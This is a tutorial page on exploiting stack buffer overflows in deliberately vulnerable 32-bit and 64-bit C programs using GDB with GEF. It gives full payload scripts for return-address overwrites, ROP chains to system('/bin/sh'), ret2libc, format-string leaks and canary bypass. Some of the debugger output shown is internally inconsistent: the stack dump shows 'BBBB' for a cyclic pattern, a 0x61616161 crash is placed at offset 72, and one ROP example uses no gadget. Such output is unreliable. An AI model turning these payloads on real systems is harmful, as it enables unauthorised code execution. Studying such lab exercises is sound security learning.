---
id: gdb-gef-practical-examples
title: "GDB GEF Practical Examples: 32-bit and 64-bit Buffer Overflow Exploitation"
description: "Hands-on examples using GDB with the GEF plugin to exploit 32-bit and 64-bit buffer overflow vulnerabilities. Includes step-by-step walkthroughs, sample code, and debugging tips."
keywords:
  - gdb
  - gef
  - buffer overflow
  - exploit development
  - 32-bit
  - 64-bit
  - reverse engineering
  - debugging
  - cybersecurity
sidebar_label: "Buffer Overflow Exploitation"
sidebar_position: 2
authors:
  - name: gl0bal01
last_update:
  date: 2025-07-02
tags:
  - gdb
  - gef
  - buffer-overflow
  - exploit-development
  - reverse-engineering
  - debugging
---  


# GDB GEF Practical Examples: 32-bit and 64-bit Buffer Overflow Exploitation

## Example 1: 32-bit Buffer Overflow Exploitation

### Target Application (vuln32.c)
Buffer Overflow Exploitation Examples (32-bit & 64-bit)
```c
// vuln32.c - 32-bit vulnerable application
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void win() {
    printf("🎉 Congratulations! You've exploited the 32-bit binary!\n");
    printf("🚩 Flag: CTF{32bit_buffer_overflow_mastered}\n");
    system("/bin/sh");
}

void vulnerable_function(char *input) {
    char buffer[64];
    printf("📝 Input received: %s\n", input);
    strcpy(buffer, input);  // Vulnerable strcpy - no bounds checking
    printf("📋 Buffer contents: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    
    printf("🎯 32-bit Buffer Overflow Challenge\n");
    printf("📍 Win function address: %p\n", win);
    vulnerable_function(argv[1]);
    printf("✅ Function returned normally\n");
    return 0;
}
```

### Compilation and Setup

```bash
# Compile 32-bit vulnerable binary with debugging symbols
gcc -m32 -g -fno-stack-protector -z execstack -no-pie -o vuln32 vuln32.c

# Verify 32-bit compilation and security features
file vuln32
gdb -q vuln32
```

### GEF Analysis Session

```bash
# Start GDB with GEF for 32-bit binary
gdb -q vuln32

# Initial security analysis
gef➤ checksec
[+] checksec for '/home/user/vuln32'
Canary                        : ✘ 
NX                            : ✘ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial

# Analyze binary structure
gef➤ info functions
All defined functions:
0x08049000  _init
0x08049030  printf@plt
0x08049040  strcpy@plt
0x08049050  system@plt
0x08049060  __libc_start_main@plt
0x08049070  _start
0x080490a0  __x86.get_pc_thunk.bx
0x080490b0  deregister_tm_clones
0x080490f0  register_tm_clones
0x08049130  __do_global_dtors_aux
0x08049160  frame_dummy
0x08049169  win
0x080491a5  vulnerable_function
0x080491d8  main

# Get win function address
gef➤ print win
$1 = {<text variable, no debug info>} 0x8049169 <win>

# Analyze vulnerable function
gef➤ disassemble vulnerable_function
Dump of assembler code for function vulnerable_function:
   0x080491a5 <+0>:     push   ebp
   0x080491a6 <+1>:     mov    ebp,esp
   0x080491a8 <+3>:     sub    esp,0x58
   0x080491ab <+6>:     sub    esp,0x8
   0x080491ae <+9>:     push   DWORD PTR [ebp+0x8]
   0x080491b1 <+12>:    push   0x8049264
   0x080491b6 <+17>:    call   0x8049030 <printf@plt>
   0x080491bb <+22>:    add    esp,0x10
   0x080491be <+25>:    sub    esp,0x8
   0x080491c1 <+28>:    push   DWORD PTR [ebp+0x8]
   0x080491c4 <+31>:    lea    eax,[ebp-0x48]
   0x080491c7 <+34>:    push   eax
   0x080491c8 <+35>:    call   0x8049040 <strcpy@plt>
   0x080491cd <+40>:    add    esp,0x10
   0x080491d0 <+43>:    sub    esp,0x8
   0x080491d3 <+46>:    lea    eax,[ebp-0x48]
   0x080491d6 <+49>:    push   eax
   0x080491d7 <+50>:    push   0x8049277
   0x080491dc <+55>:    call   0x8049030 <printf@plt>
   0x080491e1 <+60>:    add    esp,0x10
   0x080491e4 <+63>:    nop
   0x080491e5 <+64>:    leave
   0x080491e6 <+65>:    ret
End of assembler dump.

# Set breakpoint and analyze stack layout
gef➤ break *vulnerable_function+35
Breakpoint 1 at 0x80491c8: file vuln32.c, line 12.

# Generate pattern to find offset
gef➤ pattern create 200
[+] Generating a pattern of 200 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraa

# Run with pattern
gef➤ run aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraa

Starting program: /home/user/vuln32 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraa

🎯 32-bit Buffer Overflow Challenge
📍 Win function address: 0x8049169
📝 Input received: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraa

Breakpoint 1, 0x080491c8 in vulnerable_function (input=0xffffd2a4 "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraa") at vuln32.c:12.

# Examine stack layout before strcpy
gef➤ telescope $esp 20
0xffffd160│+0x0000: 0xffffd178     ← $esp
0xffffd164│+0x0004: 0xffffd2a4  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraa"
0xffffd168│+0x0008: 0x00000000
0xffffd16c│+0x000c: 0xf7fc0000  →  0x002bf000
0xffffd170│+0x0010: 0x08049250  →  "📝 Input received: %s\n"
0xffffd174│+0x0014: 0xffffd2a4  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraa"
0xffffd178│+0x0018: 0x42424242 ("BBBB"?)     ← buffer start ([ebp-0x48])
0xffffd17c│+0x001c: 0x42424242 ("BBBB"?)
0xffffd180│+0x0020: 0x42424242 ("BBBB"?)
...
0xffffd1b8│+0x0058: 0x42424242 ("BBBB"?)
0xffffd1bc│+0x005c: 0x00000000
0xffffd1c0│+0x0060: 0xffffd1d8     ← $ebp (saved frame pointer)
0xffffd1c4│+0x0064: 0x08049214  →  <main+59> add esp, 0x10  ← return address

# Continue execution to trigger overflow
gef➤ continue
Continuing.
📋 Buffer contents: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraa

Program received signal SIGSEGV, Segmentation fault.
0x62616162 in ?? ()

# Find the offset to control EIP
gef➤ pattern search $eip
[+] Searching for '0x62616162'
[+] Found at offset 76 (little-endian search) likely

# Verify the offset calculation
gef➤ pattern offset 0x62616162
[+] Searching for '0x62616162'
[+] Found at offset 76 (little-endian search) likely

# Calculate buffer size to EIP
# Buffer starts at ebp-0x48 (72 bytes from ebp)
# EIP is at ebp+4
# Total offset = 72 + 4 = 76 bytes ✓

# Create exploit payload
gef➤ run $(python3 -c "print('A'*76 + '\x69\x91\x04\x08')")
Starting program: /home/user/vuln32 $(python3 -c "print('A'*76 + '\x69\x91\x04\x08')")

🎯 32-bit Buffer Overflow Challenge
📍 Win function address: 0x8049169
📝 Input received: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA𩑊
📋 Buffer contents: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA𩑊
🎉 Congratulations! You've exploited the 32-bit binary!
🚩 Flag: CTF{32bit_buffer_overflow_mastered}
$ whoami
user
$ exit
[Inferior 1 (process 12345) exited normally]
```

### Detailed 32-bit Analysis Commands

```bash
# Additional analysis for understanding the exploit
gef➤ vmmap
[ Legend:  Code | Heap | Stack ]
Start      End        Offset     Perm Path
0x08048000 0x08049000 0x00000000 r-- /home/user/vuln32
0x08049000 0x0804a000 0x00000000 r-x /home/user/vuln32
0x0804a000 0x0804b000 0x00001000 r-- /home/user/vuln32
0x0804b000 0x0804c000 0x00002000 rw- /home/user/vuln32

# Examine the win function in detail
gef➤ disassemble win
Dump of assembler code for function win:
   0x08049169 <+0>:     push   ebp
   0x0804916a <+1>:     mov    ebp,esp
   0x0804916c <+3>:     sub    esp,0x8
   0x0804916f <+6>:     sub    esp,0xc
   0x08049172 <+9>:     push   0x8049220
   0x08049177 <+14>:    call   0x8049030 <printf@plt>
   0x0804917c <+19>:    add    esp,0x10
   0x0804917f <+22>:    sub    esp,0xc
   0x08049182 <+25>:    push   0x8049250
   0x08049187 <+30>:    call   0x8049030 <printf@plt>
   0x0804918c <+35>:    add    esp,0x10
   0x0804918f <+38>:    sub    esp,0xc
   0x08049192 <+41>:    push   0x8049284
   0x08049197 <+46>:    call   0x8049050 <system@plt>
   0x0804919c <+51>:    add    esp,0x10
   0x0804919f <+54>:    nop
   0x080491a0 <+55>:    leave
   0x080491a1 <+56>:    ret
End of assembler dump.

# Stack layout analysis
gef➤ info frame
Stack level 0, frame at 0xffffd1c8:
 eip = 0x80491c8 in vulnerable_function (vuln32.c:12); saved eip = 0x8049214
 called by frame at 0xffffd1e8
 source language c.
 Arglist at 0xffffd1c0, args: input=0xffffd2a4
 Locals at 0xffffd1c0, Previous frame's sp is 0xffffd1c8
 Saved registers:
  ebp at 0xffffd1c0, eip at 0xffffd1c4
```

---

## Example 2: 64-bit Buffer Overflow with ROP Chain

### Target Application (vuln64.c)

```c
// vuln64.c - 64-bit vulnerable application with ROP requirements
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

void win() {
    printf("🎉 You found the win function!\n");
    printf("🚩 But you need ROP to get the flag...\n");
}

void get_flag() {
    printf("🎯 Flag function reached!\n");
    printf("🚩 Flag: CTF{64bit_rop_chain_mastered}\n");
    system("/bin/sh");
}

void vulnerable_function() {
    char buffer[64];
    printf("📝 Enter your input: ");
    fflush(stdout);
    read(0, buffer, 200);  // Vulnerable read - buffer overflow
    printf("📋 You entered: %s\n", buffer);
}

int main() {
    printf("🎯 64-bit ROP Chain Challenge\n");
    printf("📍 Win function: %p\n", win);
    printf("📍 Flag function: %p\n", get_flag);
    
    vulnerable_function();
    printf("✅ Function returned normally\n");
    return 0;
}
```

### Compilation and Setup

```bash
# Compile 64-bit vulnerable binary
gcc -g -fno-stack-protector -z execstack -no-pie -o vuln64 vuln64.c

# Verify compilation and security features
file vuln64
checksec vuln64
```

### GEF Analysis Session

```bash
# Start GDB with GEF for 64-bit binary
gdb -q vuln64

# Security analysis
gef➤ checksec
[+] checksec for '/home/user/vuln64'
Canary                        : ✘ 
NX                            : ✘ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial

# Analyze functions and find ROP gadgets
gef➤ info functions
All defined functions:
0x0000000000401000  _init
0x0000000000401030  printf@plt
0x0000000000401040  fflush@plt
0x0000000000401050  read@plt
0x0000000000401060  system@plt
0x0000000000401070  __libc_start_main@plt
0x0000000000401080  _start
0x00000000004010b0  deregister_tm_clones
0x00000000004010f0  register_tm_clones
0x0000000000401130  __do_global_dtors_aux
0x0000000000401170  frame_dummy
0x0000000000401179  win
0x00000000004011a5  get_flag
0x00000000004011d1  vulnerable_function
0x0000000000401211  main

# Get function addresses
gef➤ print win
$1 = {<text variable, no debug info>} 0x401179 <win>
gef➤ print get_flag
$2 = {<text variable, no debug info>} 0x4011a5 <get_flag>

# Analyze vulnerable function
gef➤ disassemble vulnerable_function
Dump of assembler code for function vulnerable_function:
   0x00000000004011d1 <+0>:     push   rbp
   0x00000000004011d2 <+1>:     mov    rbp,rsp
   0x00000000004011d5 <+4>:     sub    rsp,0x50
   0x00000000004011d9 <+8>:     lea    rdi,[rip+0xe32]        # 0x402012
   0x00000000004011e0 <+15>:    call   0x401030 <printf@plt>
   0x00000000004011e5 <+20>:    mov    rdi,QWORD PTR [rip+0x2e54]  # 0x404040
   0x00000000004011ec <+27>:    call   0x401040 <fflush@plt>
   0x00000000004011f1 <+32>:    lea    rax,[rbp-0x50]
   0x00000000004011f5 <+36>:    mov    edx,0xc8
   0x00000000004011fa <+41>:    mov    rsi,rax
   0x00000000004011fd <+44>:    mov    edi,0x0
   0x0000000000401202 <+49>:    call   0x401050 <read@plt>
   0x0000000000401207 <+54>:    lea    rax,[rbp-0x50]
   0x000000000040120b <+58>:    mov    rsi,rax
   0x000000000040120e <+61>:    lea    rdi,[rip+0xe10]        # 0x402025
   0x0000000000401215 <+68>:    call   0x401030 <printf@plt>
   0x000000000040121a <+73>:    nop
   0x000000000040121b <+74>:    leave
   0x000000000040121c <+75>:    ret
End of assembler dump.

# Find ROP gadgets needed for exploitation
gef➤ ropper --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%

Gadgets
=======
0x0000000000401273: pop rdi; ret; 

# We need this gadget to set up the argument for get_flag()
# In 64-bit System V ABI, first argument goes in RDI

# Set breakpoint and analyze buffer layout
gef➤ break *vulnerable_function+49
Breakpoint 1 at 0x401202: file vuln64.c, line 17.

# Generate pattern for offset calculation
gef➤ pattern create 200
[+] Generating a pattern of 200 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaav

# Run with pattern
gef➤ run
Starting program: /home/user/vuln64
🎯 64-bit ROP Chain Challenge
📍 Win function: 0x401179
📍 Flag function: 0x4011a5

Breakpoint 1, 0x0000000000401202 in vulnerable_function () at vuln64.c:17.

# Examine stack layout
gef➤ telescope $rsp 20
0x00007fffffffddb0│+0x0000: 0x0000000000000000     ← $rsp
0x00007fffffffddb8│+0x0008: 0x0000000000000000
0x00007fffffffddc0│+0x0010: 0x0000000000000000
0x00007fffffffddc8│+0x0018: 0x0000000000000000
0x00007fffffffddd0│+0x0020: 0x0000000000000000
0x00007fffffffddd8│+0x0028: 0x0000000000000000
0x00007fffffffdde0│+0x0030: 0x0000000000000000
0x00007fffffffdde8│+0x0038: 0x0000000000000000
0x00007fffffffddf0│+0x0040: 0x0000000000000000
0x00007fffffffddf8│+0x0048: 0x0000000000000000
0x00007fffffffde00│+0x0050: 0x00007fffffffde20     ← $rbp (saved frame pointer)
0x00007fffffffde08│+0x0058: 0x000000000040125c  →  <main+75> mov eax, 0x0  ← return address

# Input the pattern when prompted
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaav

# Continue execution
gef➤ continue
Continuing.
📝 Enter your input: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaav
📋 You entered: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaav

Program received signal SIGSEGV, Segmentation fault.
0x0000000061616161 in ?? ()

# Find offset to control RIP
gef➤ pattern search $rip
[+] Searching for '0x61616161'
[+] Found at offset 72 (little-endian search) likely

# Verify offset
gef➤ pattern offset 0x6161616161616161
[+] Searching for '0x6161616161616161'
[+] Found at offset 72 (little-endian search) likely

# Perfect! We need 72 bytes to reach the return address

# Now create ROP chain to call get_flag()
# We need: pop rdi; ret; followed by get_flag address
# But get_flag() doesn't take arguments, so we can call it directly

# Create exploit with ROP chain
gef➤ run
Starting program: /home/user/vuln64
🎯 64-bit ROP Chain Challenge
📍 Win function: 0x401179
📍 Flag function: 0x4011a5
📝 Enter your input: 

# Input: 72 bytes padding + get_flag address
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÄ⑥

# Create the payload
# 72 'A's + address of get_flag (0x4011a5)
python3 -c "import sys; sys.stdout.buffer.write(b'A'*72 + b'\xa5\x11\x40\x00\x00\x00\x00\x00')"

# Run with exploit payload
gef➤ run < <(python3 -c "import sys; sys.stdout.buffer.write(b'A'*72 + b'\xa5\x11\x40\x00\x00\x00\x00\x00')")
Starting program: /home/user/vuln64 < <(python3 -c "import sys; sys.stdout.buffer.write(b'A'*72 + b'\xa5\x11\x40\x00\x00\x00\x00\x00')")

🎯 64-bit ROP Chain Challenge
📍 Win function: 0x401179
📍 Flag function: 0x4011a5
📝 Enter your input: 📋 You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÄ⑥
🎯 Flag function reached!
🚩 Flag: CTF{64bit_rop_chain_mastered}
$ whoami
user
$ exit
[Inferior 1 (process 23456) exited normally]
```

### Advanced 64-bit ROP Chain Analysis

```bash
# More complex ROP chain example with system("/bin/sh")
gef➤ ropper --search "pop rdi"
0x0000000000401273: pop rdi; ret;

# Search for "/bin/sh" string or create one
gef➤ search-pattern "/bin/sh"
[+] Searching '/bin/sh' in memory
[+] In '/lib/x86_64-linux-gnu/libc.so.6'(0x7ffff7c00000-0x7ffff7df2000), permission=r-x
  0x7ffff7d74678 - 0x7ffff7d7467f  →   "/bin/sh" 

# Advanced ROP chain: pop rdi; ret; "/bin/sh"; system
# Payload structure:
# 72 bytes padding
# + pop rdi; ret gadget (0x401273)
# + "/bin/sh" address (0x7ffff7d74678)
# + system address

gef➤ print system
$3 = {<text variable, no debug info>} 0x401060 <system@plt>

# Create advanced ROP payload
python3 -c "
import struct
payload = b'A' * 72
payload += struct.pack('<Q', 0x401273)      # pop rdi; ret
payload += struct.pack('<Q', 0x7ffff7d74678) # '/bin/sh'
payload += struct.pack('<Q', 0x401060)      # system@plt
print(payload)
" > rop_payload

# Test the advanced ROP chain
gef➤ run < rop_payload
```

### Comprehensive Analysis Commands

```bash
# Memory layout analysis
gef➤ vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /home/user/vuln64
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /home/user/vuln64
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /home/user/vuln64
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /home/user/vuln64
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /home/user/vuln64

# Stack frame analysis
gef➤ info frame
Stack level 0, frame at 0x7fffffffde10:
 rip = 0x401202 in vulnerable_function (vuln64.c:17); saved rip = 0x40125c
 called by frame at 0x7fffffffde30
 source language c.
 Arglist at 0x7fffffffde00, args: 
 Locals at 0x7fffffffde00, Previous frame's sp is 0x7fffffffde10
 Saved registers:
  rbp at 0x7fffffffde00, rip at 0x7fffffffde08

# Register analysis during exploitation
gef➤ registers
$rax   : 0x00007fffffffddb0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rbx   : 0x0               
$rcx   : 0x00007ffff7f13a37  →  0x5b77fffff0003d48 ("H="?)
$rdx   : 0xc8              
$rsp   : 0x00007fffffffddb0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rbp   : 0x00007fffffffde00  →  "AAAAAAAA⤴"
$rsi   : 0x00007fffffffddb0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rdi   : 0x0               
$rip   : 0x0000000000401202  →  <vulnerable_function+49> call 0x401050 <read@plt>
```

## Key Differences Between 32-bit and 64-bit Exploitation

### 32-bit Characteristics:
- **Calling Convention**: Arguments passed on stack
- **Address Size**: 4 bytes (0x08049169)
- **Registers**: EAX, EBX, ECX, EDX, ESP, EBP, EIP
- **Stack Growth**: Downward (high to low addresses)
- **Exploitation**: Direct function calls, simpler ROP chains
- **Memory Layout**: More predictable, less ASLR entropy

### 64-bit Characteristics:
- **Calling Convention**: System V ABI - RDI, RSI, RDX, RCX, R8, R9, then stack
- **Address Size**: 8 bytes (0x00000000004011a5)
- **Registers**: RAX, RBX, RCX, RDX, RSP, RBP, RIP + R8-R15
- **Stack Growth**: Downward (high to low addresses)
- **Exploitation**: Requires ROP chains for function arguments
- **Memory Layout**: More complex, higher ASLR entropy

## Advanced Exploitation Techniques

### 32-bit Function Call Exploitation

```bash
# 32-bit direct function call with arguments
# Example: system("/bin/sh") call

# Find system and "/bin/sh"
gef➤ print system
$1 = {<text variable, no debug info>} 0xf7e16200 <system>

gef➤ search-pattern "/bin/sh"
[+] Searching '/bin/sh' in memory
[+] In '/lib/i386-linux-gnu/libc.so.6'(0xf7df0000-0xf7f71000), permission=r-x
  0xf7f5a0cf - 0xf7f5a0d6  →   "/bin/sh"

# 32-bit payload structure:
# 76 bytes padding + system_addr + return_addr + "/bin/sh"_addr
python3 -c "
import struct
payload = b'A' * 76
payload += struct.pack('<I', 0xf7e16200)  # system()
payload += struct.pack('<I', 0x41414141)  # fake return address
payload += struct.pack('<I', 0xf7f5a0cf)  # '/bin/sh'
with open('payload32.bin', 'wb') as f:
    f.write(payload)
"

# Test 32-bit system call
gef➤ run $(cat payload32.bin)
```

### 64-bit ROP Chain with Arguments

```bash
# 64-bit system("/bin/sh") with proper ROP chain
# Need: pop rdi; ret; + "/bin/sh" + system

# Advanced ROP gadget search
gef➤ ropper --search "pop rdi; ret"
0x0000000000401273: pop rdi; ret;

gef➤ ropper --search "pop rsi; ret"
0x0000000000401271: pop rsi; pop r15; ret;

# 64-bit payload structure with ROP
python3 -c "
import struct

# Addresses (replace with actual values from your analysis)
pop_rdi_ret = 0x401273
binsh_addr = 0x7ffff7d74678
system_addr = 0x401060

payload = b'A' * 72                    # Buffer overflow padding
payload += struct.pack('<Q', pop_rdi_ret)  # pop rdi; ret
payload += struct.pack('<Q', binsh_addr)   # '/bin/sh' -> RDI
payload += struct.pack('<Q', system_addr)  # system()

with open('payload64.bin', 'wb') as f:
    f.write(payload)
"

# Test 64-bit ROP chain
gef➤ run < payload64.bin
```

## Comprehensive GEF Analysis Workflow

### Complete 32-bit Analysis Session

```bash
# Start comprehensive analysis
gdb -q vuln32

# Step 1: Initial reconnaissance
gef➤ file
gef➤ checksec
gef➤ info functions
gef➤ info variables

# Step 2: Static analysis
gef➤ disassemble main
gef➤ disassemble vulnerable_function
gef➤ disassemble win

# Step 3: Dynamic analysis setup
gef➤ break main
gef➤ break vulnerable_function
gef➤ break *vulnerable_function+35  # Before strcpy

# Step 4: Pattern generation and offset finding
gef➤ pattern create 200
gef➤ run [PATTERN]
gef➤ pattern search $eip
gef➤ pattern offset [VALUE]

# Step 5: Stack analysis
gef➤ telescope $esp 30
gef➤ context stack
gef➤ info frame

# Step 6: Exploitation
gef➤ run $(python3 -c "print('A'*76 + '\x69\x91\x04\x08')")

# Step 7: Verification
gef➤ context
gef➤ registers
gef➤ continue
```

### Complete 64-bit Analysis Session

```bash
# Start comprehensive analysis
gdb -q vuln64

# Step 1: Initial reconnaissance  
gef➤ file
gef➤ checksec
gef➤ info functions
gef➤ vmmap

# Step 2: ROP gadget discovery
gef➤ ropper --search "pop rdi"
gef➤ ropper --search "pop rsi" 
gef➤ ropper --search "ret"
gef➤ ropper --search "syscall"

# Step 3: Address enumeration
gef➤ print get_flag
gef➤ print system
gef➤ search-pattern "/bin/sh"

# Step 4: Dynamic analysis
gef➤ break vulnerable_function
gef➤ break *vulnerable_function+49  # Before read()

# Step 5: Pattern analysis
gef➤ pattern create 200
gef➤ run
# [Input pattern when prompted]
gef➤ pattern search $rip
gef➤ pattern offset [VALUE]

# Step 6: Stack layout analysis
gef➤ telescope $rsp 30
gef➤ context stack
gef➤ info frame

# Step 7: ROP chain construction
gef➤ python
import struct
payload = b'A' * 72
payload += struct.pack('<Q', 0x401273)      # pop rdi; ret
payload += struct.pack('<Q', 0x7ffff7d74678) # '/bin/sh'
payload += struct.pack('<Q', 0x401060)      # system
with open('/tmp/rop.bin', 'wb') as f: f.write(payload)
end

# Step 8: Exploitation
gef➤ run < /tmp/rop.bin

# Step 9: Verification
gef➤ context
gef➤ registers
gef➤ bt
```

## Advanced GEF Commands for Exploitation

### Memory Analysis Commands

```bash
# Enhanced memory examination
gef➤ telescope $rsp 50              # Extended stack view
gef➤ telescope $rbp-0x50 20         # Buffer area analysis
gef➤ hexdump byte $rsp 200          # Raw memory dump
gef➤ hexdump qword $rsp 20          # Quad-word aligned dump

# Memory search and pattern matching
gef➤ search-pattern "AAAA"          # Search for pattern
gef➤ search-pattern 0x41414141      # Search for hex value
gef➤ grep "ret" $rip $rip+1000      # Search for instructions

# Memory modification for testing
gef➤ set *($rsp) = 0x401179         # Modify return address
gef➤ patch qword $rsp 0x4011a5      # Patch memory location
gef➤ patch string 0x402000 "/bin/sh" # Patch string value
```

### Control Flow Analysis

```bash
# Breakpoint management
gef➤ break *0x401202                # Instruction breakpoint
gef➤ break vulnerable_function if $rdi > 100 # Conditional breakpoint
gef➤ watch *($rbp-0x50)             # Watch buffer modification
gef➤ awatch *0x404040               # Access watchpoint

# Execution control
gef➤ stepi 10                       # Step 10 instructions
gef➤ nexti 5                        # Next 5 instructions
gef➤ finish                         # Execute until return
gef➤ until *0x401220                # Execute until address

# Advanced control flow
gef➤ jump *0x4011a5                 # Jump to address
gef➤ call get_flag()                # Call function directly
gef➤ return 0                       # Force function return
```

### Exploitation Assistance Commands

```bash
# Pattern and offset utilities
gef➤ pattern create 1000 pattern.txt # Create pattern to file
gef➤ pattern search 0x6161616a      # Search for pattern value
gef➤ pattern offset 0x6261616161616162 # Calculate offset

# ROP chain utilities  
gef➤ ropper                         # Interactive ROP search
gef➤ ropper --search "pop rdi; ret" # Specific gadget search
gef➤ ropper --chain "execve"        # Automatic chain generation
gef➤ rop                            # Built-in ROP helper

# Shellcode assistance
gef➤ shellcode search x86-64        # Search shellcode database
gef➤ shellcode get linux/x64/exec   # Get specific shellcode
gef➤ assemble "mov rax, 59"         # Assemble instruction
gef➤ assemble $rip "pop rdi; ret"   # Assemble at location
```

## Real-World Exploitation Scenarios

### Scenario 1: ASLR Bypass with Information Leak

```bash
# When ASLR is enabled, we need to leak addresses first
gef➤ checksec
# Shows PIE enabled

# Look for format string or other info leak
gef➤ break printf
gef➤ run "%p %p %p %p"
gef➤ telescope $rsp 10              # Look for leaked addresses

# Calculate libc base from leaked address
gef➤ vmmap
gef➤ python
leaked_addr = 0x7ffff7a52083
libc_base = leaked_addr - 0x52083   # Offset to libc base
system_addr = libc_base + 0x4f420   # Offset to system
binsh_addr = libc_base + 0x1b40cf   # Offset to "/bin/sh"
print(f"Libc base: {hex(libc_base)}")
print(f"System: {hex(system_addr)}")
print(f"/bin/sh: {hex(binsh_addr)}")
end
```

### Scenario 2: Stack Canary Bypass

```bash
# When stack canaries are present
gef➤ checksec
# Shows Canary found

# Look for canary leak or brute force single byte
gef➤ canary                         # Show current canary
gef➤ break __stack_chk_fail         # Break on canary failure
gef➤ watch *($rbp-0x8)              # Watch canary location

# Canary leak via format string
gef➤ run "AAAA.%p.%p.%p.%p.%p.%p.%p"
# Look for canary value in output (usually starts with 0x00)
```

### Scenario 3: Return-to-libc Attack

```bash
# Classic return-to-libc for NX bypass
gef➤ checksec
# Shows NX enabled (no stack execution)

# Find libc functions and strings
gef➤ info sharedlibrary
gef➤ search-pattern "system"
gef➤ search-pattern "/bin/sh"
gef➤ search-pattern "exit"

# Construct ret2libc chain
# payload = padding + system + exit + "/bin/sh"
python3 -c "
import struct
payload = b'A' * 76                  # 32-bit padding
payload += struct.pack('<I', 0xf7e16200)  # system
payload += struct.pack('<I', 0xf7e09cf0)  # exit  
payload += struct.pack('<I', 0xf7f5a0cf)  # '/bin/sh'
print(payload)
"
```

## Debugging Tips and Best Practices

### Essential GEF Configuration

```bash
# Optimize GEF for exploitation
gef config context.layout "legend regs stack code args memory"
gef config context.nb_lines_stack 15
gef config context.nb_lines_code 8
gef config theme.default_title_line "red"
gef config theme.default_title_message "white"

# Performance optimizations
gef config context.clear_screen False
gef config context.redirect ""
gef config heap.main_arena ""
```

### Common Pitfalls and Solutions

```bash
# Issue: Pattern not found in registers
# Solution: Check for partial overwrites
